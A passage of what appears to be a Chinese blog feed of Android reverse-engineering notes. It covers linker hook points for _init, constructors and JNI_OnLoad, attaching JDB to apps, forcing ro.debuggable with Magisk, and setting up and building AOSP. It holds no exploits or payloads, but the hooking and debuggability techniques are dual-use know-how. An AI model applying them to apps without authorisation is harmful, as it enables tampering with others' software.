class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-function"><span class="hljs-title">call_function</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> char* function_name __unused,</span></span><br><span class="hljs-params"><span class="hljs-function">                          linker_ctor_function_t <span class="hljs-keyword">function</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">const</span> char* realpath __unused</span>)</span> &#123;<br> ......<br>    <br>  <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">g_argc, g_argv, g_envp</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>call_array实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> F&gt;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">call_array</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* array_name __unused,F* functions, <span class="hljs-keyword">size_t</span> count,</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-keyword">bool</span> reverse,</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* realpath)</span> </span>&#123; <br>  <br>  <span class="hljs-keyword">int</span> begin = reverse ? (count - <span class="hljs-number">1</span>) : <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">int</span> end = reverse ? <span class="hljs-number">-1</span> : count;<br>  <span class="hljs-keyword">int</span> step = reverse ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = begin; i != end; i += step) &#123;<br>    <span class="hljs-built_in">call_function</span>(<span class="hljs-string">&quot;function&quot;</span>, functions[i], realpath);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>call_array最终遍历所有<code>DT_INIT_ARRAY</code>的地址后调用<code>call_function</code>方法执行。</p><p>所以对于<code>_init</code>和<code>construcor</code>方法的HOOK时机，可以选择<code>call_function</code>方法(SO已完成加载,_init、construcor还未执行)</p><h3 id="Native-load-so"><a href="#Native-load-so" class="headerlink" title="Native load so"></a>Native load so</h3><p>native <code>dlopen</code>的实现在<code> /bionic/libdl/libdl.cpp</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">__attribute__((__weak__))<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">dlopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* filename, <span class="hljs-keyword">int</span> flag)</span> </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>* caller_addr = __builtin_return_address(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> __loader_dlopen(filename, flag, caller_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终会调用<code>/bionic/linker/linker.cpp</code>中的<code>do_dlopen</code>方法。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>java层loadso执行方法顺序 <code>_init--&gt;constructor--&gt;JNI_OnLoad</code></li><li>NDK开发dlopen方法loadso执行方法顺序 <code>_init--&gt;constructor</code></li><li>无论Java层还是NDK开发中的dlopen最终都会调用linker的<code>do_dlopen</code>方法</li><li>可以选择<code>OpenNativeLibrary</code>、<code>call_function</code>完成对<code>JNI_OnLoad</code>、<code>_init</code>、<code>constructor</code>方法的HOOK</li></ul>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDB调试APP</title>
    <link href="/2021/08/22/JDB%E8%B0%83%E8%AF%95APP/"/>
    <url>/2021/08/22/JDB%E8%B0%83%E8%AF%95APP/</url>
    
    <content type="html"><![CDATA[<h2 id="1-以调试模式运行APP"><a href="#1-以调试模式运行APP" class="headerlink" title="1. 以调试模式运行APP"></a>1. 以调试模式运行APP</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">am</span> start -D  <span class="hljs-keyword">com</span>.cola.jni/<span class="hljs-keyword">com</span>.cola.jni.MainActivity<br></code></pre></td></tr></table></figure><h2 id="2-转发端口到本地"><a href="#2-转发端口到本地" class="headerlink" title="2.转发端口到本地"></a>2.转发端口到本地</h2><p>使用<code>DDMS</code>转发端口</p> <img src="/2021/08/22/JDB%E8%B0%83%E8%AF%95APP/images/ddms.png" class=""><p>或者通过<code>adb</code>转发到本地</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">adb jdwp  <span class="hljs-comment">#获取可调试APP PID(判断目标APP是否可调试，将ro.debuggable设为1可调试所有APP)</span><br>adb forward tcp:<span class="hljs-number">8700</span> jdwp:$jdwp_pid<br></code></pre></td></tr></table></figure><h2 id="JDB附加"><a href="#JDB附加" class="headerlink" title="JDB附加"></a>JDB附加</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">jdb -connect com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jdi</span><span class="hljs-selector-class">.SocketAttach</span>:hostname=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>,port=<span class="hljs-number">8700</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>jdb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AOSP导入IDE</title>
    <link href="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/"/>
    <url>/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码导入-Android-Studio"><a href="#Java代码导入-Android-Studio" class="headerlink" title="Java代码导入 Android Studio"></a>Java代码导入 Android Studio</h2><h3 id="1-source-build-envsetup-sh"><a href="#1-source-build-envsetup-sh" class="headerlink" title="1.source build/envsetup.sh"></a>1.source build/envsetup.sh</h3><h3 id="2-编译生成-idegen-jar"><a href="#2-编译生成-idegen-jar" class="headerlink" title="2.编译生成 idegen.jar"></a>2.编译生成 idegen.jar</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mmm development<span class="hljs-regexp">/tools/i</span>degen/ <br></code></pre></td></tr></table></figure><p>运行完毕上面的命令之后，就在根目录生成了2个文件：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">android.ipr </span>和 <span class="hljs-keyword">android.iml</span><br></code></pre></td></tr></table></figure><h3 id="3-排除不必要的模块，提高加载速度"><a href="#3-排除不必要的模块，提高加载速度" class="headerlink" title="3.排除不必要的模块，提高加载速度"></a>3.排除不必要的模块，提高加载速度</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">打开<span class="hljs-keyword">android.iml, </span>找到excludeFolder属性,只添加framework<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/abi&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/art&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/bionic&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/bootable&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/build&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/cts&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/dalvik&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/developers&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/development&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/device&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/docs&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/external&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/hardware&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/libcore&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/libnativehelper&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/ndk&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/out&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/pdk&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/prebuilts&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/sdk&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/system&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/tools&quot;</span>/&gt;<br>&lt;excludeFolder <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$MODULE_DIR</span>$/kernel&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h3 id="4-使用Android-Studio直接android-ipr文件"><a href="#4-使用Android-Studio直接android-ipr文件" class="headerlink" title="4.使用Android Studio直接android.ipr文件"></a>4.使用Android Studio直接android.ipr文件</h3><h2 id="Native代码导入CLion"><a href="#Native代码导入CLion" class="headerlink" title="Native代码导入CLion"></a>Native代码导入CLion</h2><h3 id="1-打开开关，编译时生成CMakeLists-txt"><a href="#1-打开开关，编译时生成CMakeLists-txt" class="headerlink" title="1.打开开关，编译时生成CMakeLists.txt"></a>1.打开开关，编译时生成CMakeLists.txt</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SOONG_GEN_CMAKEFILES</span>=1<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SOONG_GEN_CMAKEFILES_DEBUG</span>=1<br></code></pre></td></tr></table></figure><h3 id="2-编译"><a href="#2-编译" class="headerlink" title="2.编译"></a>2.编译</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">make</span> -j<span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><h3 id="3-生成CMakeLists-txt"><a href="#3-生成CMakeLists-txt" class="headerlink" title="3.生成CMakeLists.txt"></a>3.生成CMakeLists.txt</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">out<span class="hljs-regexp">/development/i</span>de<span class="hljs-regexp">/clion/</span>xxxx<br></code></pre></td></tr></table></figure><h3 id="4-创建CMakeLists-txt用于合并"><a href="#4-创建CMakeLists-txt用于合并" class="headerlink" title="4. 创建CMakeLists.txt用于合并"></a>4. 创建CMakeLists.txt用于合并</h3><p><code>在clion目录下创建CMakeLists.txt</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cmake_minimum_required</span><span class="hljs-params">(VERSION <span class="hljs-number">3.6</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">project</span><span class="hljs-params">(AOSP-Native)</span></span><br><br><span class="hljs-comment">//用到了哪个模块再导入即可，要保证改目录下有CMakeLists.txt</span><br><span class="hljs-comment">// 添加子模块，导入了部分工程</span><br><span class="hljs-function"><span class="hljs-title">add_subdirectory</span><span class="hljs-params">(frameworks/native)</span></span><br>.......<br></code></pre></td></tr></table></figure><h3 id="5-CLion导入"><a href="#5-CLion导入" class="headerlink" title="5. CLion导入"></a>5. CLion导入</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 打开CLion<br><span class="hljs-bullet">2.</span> 选择「open xxxxxx」<br><span class="hljs-bullet">3.</span> 指定包含 CMakeLists.txt 的目录out/development/ide/clion<br><span class="hljs-bullet">4.</span> 选择「Open Existing Project」<br></code></pre></td></tr></table></figure><h3 id="6-更改工程根目录"><a href="#6-更改工程根目录" class="headerlink" title="6.更改工程根目录"></a>6.更改工程根目录</h3><p>设置root为aosp源码根目录</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">T<span class="hljs-function"><span class="hljs-title">ools</span> -&gt;</span> CM<span class="hljs-function"><span class="hljs-title">ake</span> -&gt;</span> Change Project Root<br></code></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="交叉引用跳转到JDK源码"><a href="#交叉引用跳转到JDK源码" class="headerlink" title="交叉引用跳转到JDK源码"></a>交叉引用跳转到JDK源码</h3><p>打开的Java代码，查看集成关系或者调用关系的时候，还是会跳转到.class文件中，而不是相应的Java类?</p><h4 id="1-删除多余的JDK和SDK"><a href="#1-删除多余的JDK和SDK" class="headerlink" title="1. 删除多余的JDK和SDK"></a>1. 删除多余的JDK和SDK</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E5%88%A0%E9%99%A4%E5%A4%9A%E4%BD%99%E7%9A%84JDK%E5%92%8CSDK.png" class=""><h4 id="2-添加JDK"><a href="#2-添加JDK" class="headerlink" title="2. 添加JDK"></a>2. 添加JDK</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E6%B7%BB%E5%8A%A0sdk.png" class=""><h4 id="3-删除JDK中Classpath和Sourcepath中的内容"><a href="#3-删除JDK中Classpath和Sourcepath中的内容" class="headerlink" title="3. 删除JDK中Classpath和Sourcepath中的内容"></a>3. 删除JDK中Classpath和Sourcepath中的内容</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E5%88%A0%E9%99%A4Classpath.png" class=""><h4 id="4-删除SDK中Classpath和Sourcepath中的内容"><a href="#4-删除SDK中Classpath和Sourcepath中的内容" class="headerlink" title="4. 删除SDK中Classpath和Sourcepath中的内容"></a>4. 删除SDK中Classpath和Sourcepath中的内容</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E5%88%A0%E9%99%A4Sourcepath.png" class=""><h4 id="5-配置Modules"><a href="#5-配置Modules" class="headerlink" title="5. 配置Modules"></a>5. 配置Modules</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E9%85%8D%E7%BD%AEModules.png" class=""><h4 id="6把framework添加到Dependencies中"><a href="#6把framework添加到Dependencies中" class="headerlink" title="6把framework添加到Dependencies中"></a>6把framework添加到Dependencies中</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/framework%E6%B7%BB%E5%8A%A0%E5%88%B0Dependencies1.png" class=""><ul><li></li></ul> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/framework%E6%B7%BB%E5%8A%A0%E5%88%B0Dependencies2.png" class=""><ul><li></li></ul> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/framework%E6%B7%BB%E5%8A%A0%E5%88%B0Dependencies3.png" class=""><ul><li></li></ul> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/framework%E6%B7%BB%E5%8A%A0%E5%88%B0Dependencies4.png" class=""><h4 id="7-确定Project-SDK选择正确"><a href="#7-确定Project-SDK选择正确" class="headerlink" title="7.  确定Project SDK选择正确"></a>7.  确定Project SDK选择正确</h4> <img src="/2021/08/22/AOSP%E5%AF%BC%E5%85%A5IDE/images/%E7%A1%AE%E5%AE%9AProjectSDK.png" class=""><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.jianshu.com/p/<span class="hljs-number">2</span>ba<span class="hljs-number">5</span>d<span class="hljs-number">6</span>bd<span class="hljs-number">461</span>e<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>rom</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android SO库与源码对应关系</title>
    <link href="/2021/08/22/Android-so%E5%BA%93%E4%B8%8E%E6%BA%90%E7%A0%81%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB/"/>
    <url>/2021/08/22/Android-so%E5%BA%93%E4%B8%8E%E6%BA%90%E7%A0%81%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<ul><li><p>libandroid.so     <code>frameworks/base/native/android</code></p></li><li><p>libandroid_runtime.so    <code>frameworks/base/core/jni</code></p></li><li><p>libandroidfw.so    <code>frameworks/base/libs/androidfw</code></p></li><li><p>libaudioutils.so    <code>system/media/audio_utils</code></p></li><li><p>libbinder.so    <code>frameworks/native/libs/binder</code></p></li><li><p>libbluedroid.so    <code>system/bluetooth/bluedroid</code></p></li><li><p>libc.so    <code>bionic/libc</code></p></li><li><p>libcamera_client.so    <code>frameworks/av/camera</code></p></li><li><p>libcorkscrew.so    <code>system/core/libcorkscrew</code></p></li><li><p>libcpustats.so    <code>frameworks/native/libs/cpustats</code></p></li><li><p>libcrypto.so    <code>external/openssl</code></p></li><li><p>libcutils.so    <code>system/core/libcutils</code></p></li><li><p>libdbus.so    <code>external/dbus/dbus</code></p></li><li><p>libdvm.so    <code>dalvik/vm</code></p></li><li><p>libart.so    <code>art/runtime</code></p></li><li><p>libemoji.so    <code>frameworks/opt/emoji</code></p></li><li><p>libETC1.so    <code>frameworks/native/opengl/libs</code></p></li><li><p>libgccdemangle    <code>external/gcc-demangle</code></p></li><li><p>libgui.so    <code>frameworks/native/libs/gui</code></p></li><li><p>libgabi++.so    <code>abi/cpp</code></p></li><li><p>libGLESv1_CM.so    <code>frameworks/native/opengl/libs</code></p></li><li><p>libharfbuzz.so    <code>external/harfbuzz</code></p></li><li><p>libhwui.so    <code>frameworks/base/libs/hwui</code></p></li><li><p>libhardware_legacy.so    <code>hardware/libhardware_legacy</code></p></li><li><p>libjpeg.so    <code>external/jpeg</code></p></li><li><p>libmedia.so    <code>frameworks/av/media/libmedia</code></p></li><li><p>libmedia_native.so    <code>frameworks/av/media/libmedia_native</code></p></li><li><p>libnetutils.so    <code>system/core/libnetutils</code></p></li><li><p>libstagefright_foundation.so    <code>frameworks/av/media/libstagefright/foundation</code></p></li><li><p>libsonivox.so    <code>external/sonivox</code></p></li><li><p>libspeexresampler    <code>external/speex</code></p></li><li><p>libstlport.so    <code>external/stlport</code></p></li><li><p>libssl.so    <code>external/openssl</code></p></li><li><p>libui.so    <code>frameworks/native/libs/ui</code></p></li><li><p>libutils.so    <code>frameworks/native/libs/utils</code></p></li><li><p>libusbhost.so    <code>system/core/libusbhost</code></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Magisk开启ro.debuggable调试</title>
    <link href="/2021/08/22/Magisk%E5%BC%80%E5%90%AFro-debuggable%E8%B0%83%E8%AF%95/"/>
    <url>/2021/08/22/Magisk%E5%BC%80%E5%90%AFro-debuggable%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">magisk resetprop ro.debuggable <span class="hljs-number">1</span><br><span class="hljs-comment">#查看ro.debuggable</span><br>getprop ro.debuggable<br><span class="hljs-comment">#重启</span><br>stop;start<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>magisk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pixel XL AOSP源码编译</title>
    <link href="/2021/08/22/pixel-XL-AOSP%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    <url>/2021/08/22/pixel-XL-AOSP%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>操作系统 ：虚拟机 ubuntu 16.04</li><li>内存 ：12G</li><li>硬盘 ：150G</li><li>CPU ：4核</li></ul><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><h3 id="1-源码分支获取"><a href="#1-源码分支获取" class="headerlink" title="1. 源码分支获取"></a>1. 源码分支获取</h3><p>根据手机型号下载对应的版本，通过以下网站获取pixel XL android 10版本的源码标记 android-10.0.0_r17</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds<br></code></pre></td></tr></table></figure> <img src="/2021/08/22/pixel-XL-AOSP%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/images/%E6%BA%90%E7%A0%81%E5%88%86%E6%94%AF%E8%8E%B7%E5%8F%96.png" class=""><h3 id="2-下载android源码"><a href="#2-下载android源码" class="headerlink" title="2.下载android源码"></a>2.下载android源码</h3><p>repo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo apt-get install git-core<br>sudo apt-get install git-core curl<br>mkdir ~/<span class="hljs-built_in">bin</span>/<br>cd ~/<span class="hljs-built_in">bin</span><br><br>curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/<span class="hljs-built_in">bin</span>/repo<br>chmod a+x ~/<span class="hljs-built_in">bin</span>/repo<br>gedit ~/.bashrc<br></code></pre></td></tr></table></figure><p>在~/.bashrc里添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#国内镜像</span><br>export REPO_URL=<span class="hljs-string">&#x27;https://aosp.tuna.tsinghua.edu.cn/git-repo&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="3-同步代码"><a href="#3-同步代码" class="headerlink" title="3. 同步代码"></a>3. 同步代码</h3><h4 id="3-1-第一种方式"><a href="#3-1-第一种方式" class="headerlink" title="3.1 第一种方式"></a>3.1 第一种方式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">cd ~/work/sources/android-<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>_r17<br>repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>_r17<br>repo sync -c --no-tags --prune -f -j4  <span class="hljs-comment">#线程根据cpu核数决定 一般为cpu核数x2，此处采用4线程</span><br></code></pre></td></tr></table></figure><p>参数介绍:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs //参数说明">-c, --current-branch fetch only current branch from server.<br>这个选项指定只获取执行 repo init 时 -b 选项所指定的分支，不会获取远端服务器的分支信息。<br>例如服务器上新增了其他分支，使用 -c 选项同步后，在本地 git 仓库执行 git branch -r 命令看不到服务器新增的分支名。如果不加 -c 选项，那么同步的时候，会打印 [new branch] 这样的信息，使用 git branch -r 命令可查看到服务器新增的分支。<br><br>–no-tags don’t fetch tags.<br>该选项指定不获取服务器上的tag信息。<br><br>–prune delete refs that no longer exist on the remote.<br>如果远端服务器已经删除了某个分支，在 repo sync 时加上 --prune 选项，可以让本地仓库删除对这个分支的跟踪引用。<br><br>-j JOBS, --jobs=JOBS projects to fetch simultaneously (default 2).<br>指定启用多少个线程来同步。<br>例如上面的 -j 4 指定用4个线程来同步。如果没有提供该选项，默认是用2个线程。<br><br>-f：即使某个项目同步失败，也继续同步其他项目。<br><br>总的来说，在 repo sync -c --no-tags --prune -j 4 命令中，使用 -c 和 --no-tags 选项可以减少需要同步的内容，从而减少要占用的本地代码空间，也可以减少一些同步时间。<br>使用 -j 选项来指定启用多线程进行同步，可以加快执行速度，也就减少了同步时间。<br>使用 --prune 选项去掉已删除分支的跟踪引用，一般不会用到，这个选项可加可不加。<br></code></pre></td></tr></table></figure><h4 id="3-1-第二种方式-未尝试此方法不知道是否可行"><a href="#3-1-第二种方式-未尝试此方法不知道是否可行" class="headerlink" title="3.1 第二种方式(未尝试此方法不知道是否可行)"></a>3.1 第二种方式(未尝试此方法不知道是否可行)</h4><p>下载源码的初始化包（加速源码下载） 大约60G</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span 